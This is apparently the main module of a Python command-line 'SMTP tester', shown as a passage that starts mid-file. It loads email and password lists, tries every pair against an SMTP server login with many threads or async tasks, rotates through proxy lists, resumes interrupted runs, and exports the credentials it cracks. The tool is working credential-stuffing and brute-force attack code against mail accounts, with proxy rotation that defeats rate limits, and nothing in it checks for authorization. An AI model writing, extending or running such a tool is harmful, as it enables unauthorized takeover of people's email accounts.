        if args.timeout:
            self.config.smtp_timeout = args.timeout
        if args.email_file:
            self.config.email_file = args.email_file
        if args.password_file:
            self.config.password_file = args.password_file
        if args.output_dir:
            self.config.output_dir = args.output_dir
        if args.output_format:
            self.config.output_format = OutputFormat(args.output_format)
        if args.max_workers:
            self.config.max_workers = args.max_workers
        if args.max_async_tasks:
            self.config.max_async_tasks = args.max_async_tasks
        if args.rate_limit is not None:
            self.config.rate_limit = args.rate_limit
        if args.retry_count:
            self.config.retry_count = args.retry_count
        if args.verbose is not None:
            self.config.verbose = args.verbose
        if args.log_level:
            self.config.log_level = LogLevel(args.log_level)
        if args.save_tried is not None:
            self.config.save_tried = args.save_tried
        if args.resume is not None:
            self.config.resume = args.resume

        # Proxy settings
        if args.proxy_type:
            self.config.proxy_config.proxy_type = ProxyType(args.proxy_type)
        if args.proxy_file:
            self.config.proxy_config.proxy_file = args.proxy_file
        if args.proxy:
            self.config.proxy_config.proxy_list = [args.proxy]
            self.config.proxy_config.proxy_type = ProxyType.SOCKS5

        # Create default config if requested
        if args.create_config:
            ConfigManager.save_config(self.config, args.create_config)
            console.print(f"[green]Configuration saved to {args.create_config}[/green]")
            sys.exit(0)

        # Initialize components
        self.logger = SMTPLogger(self.config.log_level, getattr(args, 'log_file', None))
        self.ui = UIManager(self.config)
        self.exporter = ExportManager(self.config.output_dir)

        # Initialize tester
        if args.use_async and args.use_async is not False:
            self.tester = AsyncSMTPTester(self.config, self.logger)
        else:
            self.tester = SMTPTester(self.config, self.logger)

    def interactive_mode(self):
        """Run in interactive mode"""
        self.ui.show_banner()

        # Get SMTP settings
        console.print("\n[bold cyan]SMTP Configuration[/bold cyan]")
        if not self.config.smtp_host:
            self.config.smtp_host = Prompt.ask("[yellow]SMTP Host[/yellow]", default="smtp.gmail.com")
        if not self.config.smtp_port:
            self.config.smtp_port = int(Prompt.ask("[yellow]SMTP Port[/yellow]", default="587", show_default=True))

        security_choices = ["none", "ssl", "tls", "starttls"]
        security_default = "starttls"
        security = Prompt.ask(
            "[yellow]Security Mode[/yellow]",
            choices=security_choices,
            default=security_default
        )
        self.config.smtp_security = SMTPSecurity(security)

        # Get input files
        console.print("\n[bold cyan]Input Files[/bold cyan]")
        if not self.config.email_file or not os.path.exists(self.config.email_file):
            self.config.email_file = Prompt.ask("[yellow]Email list file[/yellow]", default="emails.txt")

        if not self.config.password_file or not os.path.exists(self.config.password_file):
            use_default = Confirm.ask("[yellow]Use default password list?[/yellow]", default=True)
            if use_default:
                self.config.password_file = "passwords.txt"
            else:
                self.config.password_file = Prompt.ask("[yellow]Password list file[/yellow]")

        # Proxy settings
        console.print("\n[bold cyan]Proxy Configuration[/bold cyan]")
        use_proxy = Confirm.ask("[yellow]Use proxy?[/yellow]", default=False)

        if use_proxy:
            proxy_types = ["http", "socks4", "socks5", "rotating"]
            proxy_type = Prompt.ask("[yellow]Proxy type[/yellow]", choices=proxy_types, default="socks5")
            self.config.proxy_config.proxy_type = ProxyType(proxy_type)

            use_default_proxy = Confirm.ask("[yellow]Use default proxy list?[/yellow]", default=False)
            if use_default_proxy:
                self.config.proxy_config.proxy_file = "proxies.txt"
            else:
                self.config.proxy_config.proxy_file = Prompt.ask("[yellow]Proxy list file[/yellow]")

        # Performance settings
        console.print("\n[bold cyan]Performance Settings[/bold cyan]")
        self.config.max_workers = int(Prompt.ask("[yellow]Worker threads[/yellow]", default="10", show_default=True))
        self.config.max_async_tasks = int(Prompt.ask("[yellow]Async tasks[/yellow]", default="50", show_default=True))

    def run(self):
        """Run the SMTP tester"""
        try:
            # Check required settings
            if not self.config.smtp_host:
                console.print("[red]Error: SMTP host is required[/red]")
                return

            if not os.path.exists(self.config.email_file):
                console.print(f"[red]Error: Email file not found: {self.config.email_file}[/red]")
                return

            if not os.path.exists(self.config.password_file):
                console.print(f"[red]Error: Password file not found: {self.config.password_file}[/red]")
                return

            # Show config
            self.ui.show_banner()
            self.ui.show_config_summary(self.config)

            # Load proxies if configured
            if self.config.proxy_config.proxy_type != ProxyType.NONE and self.config.proxy_config.proxy_file:
                count = self.tester.proxy_manager.load_proxies(self.config.proxy_config.proxy_file)
                console.print(f"\n[green]Loaded {count} proxies[/green]")

            # Load credentials
            console.print("\n[cyan]Loading credentials...[/cyan]")
            emails, passwords = self.tester.load_credentials()

            # Validate emails
            valid_emails, invalid_emails = EmailValidator.validate_email_list(emails)
            if invalid_emails:
                console.print(f"[yellow]Skipped {len(invalid_emails)} invalid email addresses[/yellow]")

            console.print(f"[green]Loaded {len(valid_emails)} valid emails[/green]")
            console.print(f"[green]Loaded {len(passwords)} passwords[/green]")

            # Calculate total tests
            total_tests = len(valid_emails) * len(passwords)
            console.print(f"\n[cyan]Total tests to perform: {total_tests:,}[/cyan]")

            # Confirm start
            if not Confirm.ask("\n[yellow]Start testing?[/yellow]", default=True):
                console.print("[red]Testing cancelled[/red]")
                return

            # Run tests
            console.print("\n[bold green]Starting SMTP tests...[/bold green]\n")

            start_time = time.time()
            self.tester.stats.start_time = start_time
            self.tester.stats.total_tests = total_tests

            with self.ui.create_progress() as progress:
                task = progress.add_task("[cyan]Testing...", total=total_tests)

                def update_progress(result: TestResult):
                    progress.update(task, advance=1)
                    if result.success:
                        console.print(f"[green]✓ Found: {result.email}:{result.password}[/green]")

                if isinstance(self.tester, AsyncSMTPTester):
                    # Run async
                    asyncio.run(self.tester.run_async(valid_emails, passwords, update_progress))
                else:
                    # Run threaded
                    self._run_threaded(valid_emails, passwords, progress, task)

            self.tester.stats.end_time = time.time()

            # Show results
            console.print("\n")
            self.ui.show_statistics(self.tester.stats)

            if self.tester.results:
                self.ui.show_found_credentials(self.tester.results)

            if self.config.proxy_config.proxy_type != ProxyType.NONE:
                self.ui.show_proxy_stats(self.tester.proxy_manager.proxy_stats)

            # Export results
            console.print("\n[cyan]Exporting results...[/cyan]")
            if self.config.output_format == OutputFormat.ALL:
                exported = self.exporter.export_all(self.tester.results)
            elif self.config.output_format == OutputFormat.JSON:
                exported = {"json": self.exporter.export_json(self.tester.results)}
            elif self.config.output_format == OutputFormat.CSV:
                exported = {"csv": self.exporter.export_csv(self.tester.results)}
            else:
                exported = {"txt": self.exporter.export_txt(self.tester.results)}

            console.print(f"[green]Results exported to: {self.config.output_dir}[/green]")
            for fmt, path in exported.items():
                console.print(f"  • {fmt.upper()}: {path}")

            # Summary
            console.print(f"\n[bold green]Testing complete![/bold green]")
            console.print(f"  Duration: {self.tester.stats.elapsed_time:.2f} seconds")
            console.print(f"  Successful: {self.tester.stats.successful_tests}")
            console.print(f"  Failed: {self.tester.stats.failed_tests}")

        except KeyboardInterrupt:
            console.print("\n[yellow]Testing interrupted by user[/yellow]")
            self.tester.stop()
        except Exception as e:
            console.print(f"\n[red]Error: {e}[/red]")
            if self.config.verbose:
                import traceback
                traceback.print_exc()

    def _run_threaded(self, emails: List[str], passwords: List[str], progress, task):
        """Run tests using thread pool"""
        from concurrent.futures import ThreadPoolExecutor, as_completed

        with ThreadPoolExecutor(max_workers=self.config.max_workers) as executor:
            futures = []

            for email in emails:
                for password in passwords:
                    if self.tester.is_stopped():
                        break

                    # Skip already tried
                    credential_key = f"{email}:{password}"
                    if credential_key in self.tester.tried_credentials:
                        self.tester.stats.skipped_tests += 1
                        progress.update(task, advance=1)
                        continue

                    # Get proxy
                    proxy = None
                    if self.config.proxy_config.proxy_type != ProxyType.NONE:
                        proxy = self.config.proxy_config.get_next_proxy()

                    future = executor.submit(
                        self.tester.test_smtp_connection,
                        email,
                        password,
                        proxy
                    )
                    futures.append(future)

                    # Rate limiting
                    if self.config.rate_limit > 0:
                        time.sleep(1.0 / self.config.rate_limit)

            # Process results
            for future in as_completed(futures):
                if self.tester.is_stopped():
                    break

                result = future.result()
                if result:
                    self.tester.save_result(result)
                    progress.update(task, advance=1)

                    if result.success:
                        console.print(f"[green]✓ Found: {result.email}:{result.password}[/green]")


def main():
    """Main entry point"""
    app = SMTPTesterApp()
    args = app.parse_arguments()

    # Check if running in interactive mode
    if not args.smtp_host and not args.config_file:
        app.initialize(args)
        app.interactive_mode()
        app.run()
    else:
        app.initialize(args)
        app.run()


if __name__ == "__main__":
    main()
